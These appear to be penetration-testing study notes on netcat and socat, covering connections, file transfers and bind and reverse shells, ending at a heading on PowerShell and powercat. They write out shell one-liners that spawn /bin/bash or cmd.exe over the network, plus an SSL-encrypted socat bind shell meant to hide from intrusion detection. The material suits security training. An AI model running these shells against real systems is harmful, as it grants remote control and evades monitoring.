# PRACTICAL TOOLS
+ Modern security professional uses various tools but there may be limited ones in target system after gaining access
+ So we learn how to deliver our tools to target machine and so on...

# 1 - NETCAT
+ one of original tools for penetration testers
+ It reads and writes data through network using TCP/UDP protocols

## 1.1 - CONNECTING TO A TCP/UDP PORT
+ netcat can run in client/server mode
+ We can connect to remote server using IP/PORT of the server

```bash
# Connect to server assigned <DESTINATION IP> with port <PORT>
nc -n -v <DESTINATION IP> <PORT>
# -n prevents name resolution and -v is verbose mode
```

## 1.2 - LISTENING ON A TCP/UDP PORT
+ Usefull for recieving in network connections
+ Making a chat server using netcat

```bash
# server for listening
nc -lvnp <PORT>
# -l is listening mode
# -v is verbose mode
# -n is no name resolution mode
# -p is specified port

# client
nc <IP ADDRESS> <PORT>

# After connecting enter text to chat
```


## 1.3 - LISTENING ON A TCP/UDP PORT
+ We can transfer files using netcat like server/client chat example with some minor differences
+ We should guess when the transfer is done based on file size
+ We can confirm that the file is transfered successfully by calculating sha256 hash

```bash
# Server which recieves the file
nc -lvnp <PORT> > /path/to/file

# Client which sends the file
nc <IP ADDRESS> <PORT> < /path/to/file
```

## 1.4 - REMOTE ADMINISTRATION WITH NETCAT
+ netcat has command redirection
+ It can redirect input/output of an executable to a TCP/UDP port

![01](./images/01.png)

Bob is running Windows and Alice is running Linux\
In first scenario Alice wants to connect to Bob's machine and do stuff

**netcat bind shell scenario**
+ Bob starts netcat as server and bind `cmd.exe` to port 4444
+ netcat bind `cmd.exe` to port 4444 and redirect input/output/error of `cmd.exe` to port 4444
+ So anyone connecting to Bob's IP address on port 4444 wil be prompted `cmd.exe` and his WIndows comand prompt shell

```bash
# Bob's Windows machine as a server
nc -lvnp 4444 -e cmd.exe

# Alice's Linux machine as a client
nc -nv <Bob IP> 4444
# this will result Bob's computer cmd.exe
```


![02](./images/02.png)
In second scenario Bob wants to connect to Alice's computer and do stuff
**netcat reverse shell scenario**
+ First Bob starts netcat on port 4444 on his Windows machine
+ Alice can send reverse shell from her Linux machine to Bob

```bash
# Bob's Windows machine as a server
nc -lvnp 4444

# Alice's Linux machine as a client
nc -nv <Bob IP> 4444 -e /bin/bash
# this will result reverse shell from Alice's computer to Bob on port 4444
```

+ Take some time to read about **bind**/**reverse** shell scenario

# 2 - SOCAT
+ Establish two bidirectional byte streams to transfer data
+ similar to netcat but has additional features
+ We can estanlish connection and connect to remote host like this: 

```bash
socat - TCP:10.11.0.22:110
# - indicates transfer data between stdin and remote host
# TCP is the transfer protocol
# 10.11.0.22 is the remote host IP address
# 110 is the remote port number
```

+ We can start listening and fire up a server like this:

```bash
socat TCP4-LISTEN:10001 STDOUT
# TCP4-LISTEN is the transfer protocol in listen mode
# 10001 is listening port number
# STDOUT is for redirecting stdout for bidirectional chat
```

## 2.1 - SOCAT FILE TRANSFERS
+ Let's assume Alice wants to transfer a file named `secrets.txt` to Bob using socat
+ Alice  should be server and Bob should be client

```bash
# Server-side for transfering file by Alice
# fork indicates creating a child process
# file indicates reading input from file secrets.txt 
socat TCP4-LISTEN:10001,fork file:secrets.txt 

# Client-side for receiving file by Bob
socat TCP4:10.11.0.4:10001 file:receeved_secrets.txt,create
# create indicates creating and redirecting output to the file receeved_secrets.txt
```


## 2.2 - SOCAT REVERSE SHELLS
+ Bob will start the listener on port 10001 and Alice will connect to it and gives him a reverse shell

```bash
# Bob's side as listener
# -d -d is to increase verbosity
socat -d -d TCP4-LISTEN:10001 STDOUT


# Alice's side
# EXEC option like -e option in netcat
socat TCP4:10.11.0.22:10001 EXEC:/bin/bash
```


## 2.3 - SOCAT ENCRYPTED BIND SHELLS
+ We will use Encryption to hide shell activities and hide it from intrusion detection systems (IDS)
+ We will use Secure Sockets Layer protocol (SSL) to encrypt out shell
+ We will first generate a self-signed SSL certificate by using `openssl` command

```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
# -req and -x509 create self-signed certificate
# -newkey will generate new private key
# rsa:2048 will use RSA encryption with 2048 bit key length
# -nodes will store the private key unencrypted
# -keyout file.key will save the key to a file
# -days indicates validity period in days
# -out will save the certificate to a file
```

+ After creating the certificate we will convert them to a format that socat can accept

```bash
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

+ Now Let's create the encrypted socat listener at Alice's side

```bash
sudo socat OPENSSL_LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
# OPENSSL_LISTEN:443 option creates SSL listener on port 443
# cert option specify our certificate file
# verfiy=0 disable SSL verifications
# fork spawns a child process when a connection made to the listener
# EXEC will execute /bin/basha and redirect its output to remote host
```

+ Now Let's connect to Alice's bind shell from Bob's side

```bash
socat - OPENSSL:10.11.0.4:443,verify=0
# - indicates transfer data between stdin and remote host
# OPENSSL establishes remote SSL connection to Alice's listener 
# verify=0 disable SSL certificate verification
```

# 3 - POWERSHELL AND POWERCAT
